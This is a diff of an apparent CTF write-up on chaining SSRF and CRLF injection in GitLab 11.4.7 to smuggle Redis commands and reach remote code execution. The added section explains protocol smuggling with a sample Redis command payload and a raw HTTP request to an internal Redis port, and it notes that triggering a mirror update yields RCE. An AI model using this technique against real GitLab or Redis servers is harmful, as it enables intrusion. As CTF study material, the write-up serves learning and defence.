@@ -1,5 +1,45 @@
+## Little on Protocol Smuggling
+So basically if we can inject CR-LF anywhere in request headers we get protocol smuggling
 
-Lets exploit gitlab/gitlab-ce:11.4.7-ce.0 ssrf+crlf from RWCTF (from code audit to rce) 1-day
+>  Whats protocol smuggling?
+
+Basically making a call in 1 protocol that is understood by another protocol. In this example we made a HTTP call which is understood by redis.
+
+So if there is newline thing(CRLF) anywhere  in header part, redis ignore all error and execute the redis command
+
+```
+GET /[EXPLOIT-1] HTTP/1.1     <= can be at URL
+Host: 127.0.0.1:6379
+Cookie: [EXPLOIT-2]           <= newline at cookie and we get CRLF
+
+data:[EXPLOIT-3] 			  <= or some data we control
+```
+
+So if we make a HTTP call to redis, obviously it donot understand HTTP protocol but the fun part is it doesnt give error and if it finds valid redis command it will even execute it.
+
+so [EXPLOIT-n] can be like
+
+```
+A\r\n\n
+multi
+lpush task "Asdf"
+exec
+
+A\n\n
+```
+
+ACTUAL request
+```
+GET /A\r\n\n\multi\nlpush\n task "asdf"\nexec\nA\n\n HTTP/1.1
+Host: 127.0.0.1:6379
+```
+
+will end up inserting the value "Asdf" in variable "task" in redis
+
+
+## ==============
+
+Now Lets exploit gitlab/gitlab-ce:11.4.7-ce.0 ssrf+crlf from RWCTF (from code audit to rce) 1-day
 
 ## SETUP
 
@@ -157,11 +197,7 @@ exec
 Putting that in mirror functionality results in a 500 returned from gitlab. This happens due to gitlab trying to render our URL and in failing to do so, refusing to respond with anything meaningful
 
 That’s not helpful given that we still need to trigger the mirror by clicking the little refresh button (or just sending POST to update_now?sync_remote=true)
-
 Doing the latter gives us full RCE.
-
-
-========
 
 ## Little on Protocol Smuggling
 So basically if we can inject CR-LF anywhere in request headers we get protocol smuggling
@@ -205,3 +241,4 @@ will end up inserting the value "Asdf" in variable "task" in redis
 
 #### Reference https://desc0n0cid0.blogspot.com/2019/01/chaining-2-low-impact-bugs-into-gitlab.html
 
+=======
